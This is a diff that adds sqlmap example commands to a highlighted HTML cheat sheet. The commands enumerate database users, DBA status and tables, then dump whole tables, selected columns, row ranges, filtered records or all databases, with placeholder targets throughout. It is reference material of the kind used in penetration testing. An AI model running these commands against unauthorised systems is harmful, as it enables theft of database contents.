@@ -128,6 +128,28 @@ sqlmap <span class="nt">-u</span> <span class="s2">"&lt;target URL&gt;"</span> <
 <span class="c"># if they might fail, and a higher risk means more dangerous</span>
 <span class="c"># payloads. increase verbosity to see additional payloads:</span>
 sqlmap <span class="nt">-u</span> <span class="s2">"&lt;target URL&gt;"</span> <span class="nt">--data</span><span class="o">=</span><span class="s1">'param=1'</span> <span class="nt">-v</span> 3 <span class="nt">--level</span><span class="o">=</span>&lt;1-5&gt; <span class="nt">--risk</span><span class="o">=</span>&lt;1-3&gt;
+
+<span class="c"># enumerate version banner, users, database name and check</span>
+<span class="c"># if we are DBadmin:</span>
+sqlmap <span class="nt">-u</span> <span class="s2">"&lt;target URL&gt;"</span> <span class="nt">--banner</span> <span class="nt">--current-user</span> <span class="nt">--current-db</span> <span class="nt">--is-dba</span>
+
+<span class="c"># enumerate table names of specific DB:</span>
+sqlmap <span class="nt">-u</span> <span class="s2">"&lt;target URL&gt;"</span> <span class="nt">--tables</span> <span class="nt">-D</span> <span class="s2">"&lt;database name&gt;"</span>
+
+<span class="c"># get all records of specific table:</span>
+sqlmap <span class="nt">-u</span> <span class="s2">"&lt;target URL&gt;"</span> <span class="nt">--dump</span> <span class="nt">-T</span> <span class="s2">"&lt;table name&gt;"</span> <span class="nt">-D</span> <span class="s2">"&lt;database name&gt;"</span>
+
+<span class="c"># get specific columns from a table's records:</span>
+sqlmap <span class="nt">-u</span> <span class="s2">"&lt;target URL&gt;"</span> <span class="nt">--dump</span> <span class="nt">-T</span> <span class="s2">"&lt;table name&gt;"</span> <span class="nt">-D</span> <span class="s2">"&lt;database name&gt;"</span> <span class="nt">-C</span> &lt;comma-separated names of columns&gt;
+
+<span class="c"># get specific rows by ordinal number from a table's records:</span>
+sqlmap <span class="nt">-u</span> <span class="s2">"&lt;target URL&gt;"</span> <span class="nt">--dump</span> <span class="nt">-T</span> <span class="s2">"&lt;table name&gt;"</span> <span class="nt">-D</span> <span class="s2">"&lt;database name&gt;"</span> <span class="nt">--start</span><span class="o">=</span>&lt;num&gt; <span class="nt">--stop</span><span class="o">=</span>&lt;num&gt;
+
+<span class="c"># get specific records with WHERE condition on specific table:</span>
+sqlmap <span class="nt">-u</span> <span class="s2">"&lt;target URL&gt;"</span> <span class="nt">--dump</span> <span class="nt">-T</span> <span class="s2">"&lt;table name&gt;"</span> <span class="nt">-D</span> <span class="s2">"&lt;database name&gt;"</span> <span class="nt">--where</span><span class="o">=</span><span class="s2">"name LIKE '%eve'"</span>
+
+<span class="c"># dump everything but exclude system databases:</span>
+sqlmap <span class="nt">-u</span> <span class="s2">"&lt;target URL&gt;"</span> <span class="nt">--dump-all</span> <span class="nt">--exclude-sysdbs</span>
 </code></pre></div>
 
 <h2>specific tuning</h2>
